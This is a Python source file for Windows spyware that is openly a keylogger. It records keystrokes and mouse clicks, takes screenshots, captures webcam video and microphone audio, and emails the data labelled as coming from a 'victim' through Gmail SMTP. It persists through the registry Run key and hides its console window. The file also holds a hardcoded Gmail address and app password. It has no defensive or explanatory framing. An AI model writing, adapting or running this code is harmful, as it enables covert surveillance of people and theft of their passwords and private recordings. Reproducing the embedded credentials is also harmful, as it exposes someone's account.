import sys
import pythoncom
import os, time, random, smtplib, string, base64
from email.message import EmailMessage
import PyHook3
from winreg import *
import cv2
import sounddevice as sd
from scipy.io.wavfile import write 
from datetime import datetime
import logging
from logging.handlers import RotatingFileHandler
from pathlib import Path

# Set up logging
log_dir = Path('logs')
log_dir.mkdir(exist_ok=True)
log_file = log_dir / 'application.log'
handler = RotatingFileHandler(log_file, maxBytes=5000000, backupCount=5)
logging.basicConfig(level=logging.INFO, handlers=[handler], format='%(asctime)s - %(levelname)s - %(message)s')

global t, start_time, pics_names, yourgmail, yourgmailpass, sendto, interval, log_file_path, video_file_path, audio_file_path

t = ""
pics_names = []

######### Settings ########

yourgmail = "baluanush496@gmail.com"
yourgmailpass = "odyerpirappdklkp"
sendto = "baluanush20001806@gmail.com"
interval = 20

# Create directories for organization
Path('screenshots').mkdir(exist_ok=True)
Path('audio').mkdir(exist_ok=True)
Path('video').mkdir(exist_ok=True)

try:
    with open('logs/Logfile.txt', 'a'):
        pass
except Exception as e:
    logging.error(f"Error initializing log file: {e}")
    with open('logs/Logfile.txt', 'w'):
        pass


def addStartup():  # this will add the file to the startup registry key
    try:
        fp = os.path.dirname(os.path.realpath(__file__))
        file_name = sys.argv[0].split('\\')[-1]
        new_file_path = fp + '\\' + file_name
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ, new_file_path)
        print("Added to startup")
    except Exception as e:
        logging.error(f"Error adding to startup: {e}")


def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)
    print("Console hidden")


addStartup()
Hide()


def ScreenShot():
    global pics_names
    import pyautogui

    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))

    try:
        name = str(generate_name())
        file_path = os.path.join('screenshots', name + '.png')
        pics_names.append(file_path)
        pyautogui.screenshot().save(file_path)
        logging.info(f"Screenshot saved: {file_path}")
        print(f"Screenshot saved: {file_path}")
    except Exception as e:
        logging.error(f"Error taking screenshot: {e}")


def generate_unique_filename(prefix, extension):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    return f"{prefix}_{timestamp}.{extension}"


def record_webcam(duration=10):
    global video_file_path
    try:
        cap = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_file_path = os.path.join('video', generate_unique_filename('webcam', 'mp4'))
        out = cv2.VideoWriter(video_file_path, fourcc, 20.0, (640, 480))
        start_time = time.time()

        print("Started recording webcam")
        while int(time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            else:
                break

        cap.release()
        out.release()
        cv2.destroyAllWindows()
        logging.info(f"Webcam video saved: {video_file_path}")
        print(f"Webcam video saved: {video_file_path}")
    except Exception as e:
        logging.error(f"Error recording webcam: {e}")


def record_audio(duration=10):
    global audio_file_path
    try:
        fs = 44100  # Sample rate
        audio_file_path = os.path.join('audio', generate_unique_filename('mic', 'wav'))
        myrecording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        print("Started recording audio")
        sd.wait()  # Wait until recording is finished
        write(audio_file_path, fs, myrecording)  # Save as WAV file
        logging.info(f"Audio recording saved: {audio_file_path}")
        print(f"Audio recording saved: {audio_file_path}")
    except Exception as e:
        logging.error(f"Error recording audio: {e}")


def Mail_it(data, pics_names):
    global log_file_path, video_file_path, audio_file_path
    try:
        data = base64.b64encode(data.encode()).decode()
        msg = EmailMessage()
        msg.set_content('New data from victim(Base64 encoded)\n' + data)
        msg['Subject'] = 'Keylogger Log Data'
        msg['From'] = yourgmail
        msg['To'] = sendto

        # Attach screenshots
        for pic in pics_names:
            with open(pic, 'rb') as f:
                file_data = f.read()
                file_name = os.path.basename(f.name)
            msg.add_attachment(file_data, maintype='image', subtype='png', filename=file_name)

        # Attach log file
        with open(log_file_path, 'rb') as f:
            log_data = f.read()
            msg.add_attachment(log_data, maintype='text', subtype='plain', filename=os.path.basename(log_file_path))

        # Attach webcam video
        with open(video_file_path, 'rb') as f:
            video_data = f.read()
            msg.add_attachment(video_data, maintype='video', subtype='mp4', filename=os.path.basename(video_file_path))

        # Attach audio recording
        with open(audio_file_path, 'rb') as f:
            audio_data = f.read()
            msg.add_attachment(audio_data, maintype='audio', subtype='wav', filename=os.path.basename(audio_file_path))

        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(yourgmail, yourgmailpass)
        server.send_message(msg)
        server.quit()
        logging.info("Email sent successfully.")
        print("Email sent successfully.")
    except Exception as e:
        logging.error(f"Error sending email: {e}")


def OnMouseEvent(event):
    global yourgmail, yourgmailpass, sendto, interval, log_file_path
    try:
        data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
               + ' WindowName : ' + str(event.WindowName)
        data += '\n\tButton:' + str(event.MessageName)
        data += '\n\tClicked in (Position):' + str(event.Position)
        data += '\n===================='
        global t, start_time, pics_names

        t = t + data

        if len(t) > 300:
            ScreenShot()

        if len(t) > 500:
            with open(log_file_path, 'a') as f:
                f.write(t)
            t = ''

        if int(time.time() - start_time) >= int(interval):
            # Record webcam and audio
            record_webcam(10)
            record_audio(10)
            Mail_it(t, pics_names)
            start_time = time.time()
            t = ''
            log_file_path = os.path.join('logs', generate_unique_filename('Logfile', 'txt'))
            print(f"New log file created: {log_file_path}")
    except Exception as e:
        logging.error(f"Error in OnMouseEvent: {e}")

    return True


def OnKeyboardEvent(event):
    global yourgmail, yourgmailpass, sendto, interval, log_file_path
    try:
        data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
               + ' WindowName : ' + str(event.WindowName)
        data += '\n\tKeyboard key :' + str(event.Key)
        data += '\n===================='
        global t, start_time
        t = t + data

        if len(t) > 500:
            with open(log_file_path, 'a') as f:
                f.write(t)
            t = ''

        if int(time.time() - start_time) >= int(interval):
            # Record webcam and audio
            record_webcam(10)
            record_audio(10)
            Mail_it(t, pics_names)
            t = ''
            log_file_path = os.path.join('logs', generate_unique_filename('Logfile', 'txt'))
            print(f"New log file created: {log_file_path}")
    except Exception as e:
        logging.error(f"Error in OnKeyboardEvent: {e}")

    return True


hook = PyHook3.HookManager()

hook.KeyDown = OnKeyboardEvent

hook.MouseAllButtonsDown = OnMouseEvent

hook.HookKeyboard()

hook.HookMouse()

start_time = time.time()
log_file_path = os.path.join('logs', generate_unique_filename('Logfile', 'txt'))
print(f"Initial log file created: {log_file_path}")

pythoncom.PumpMessages()
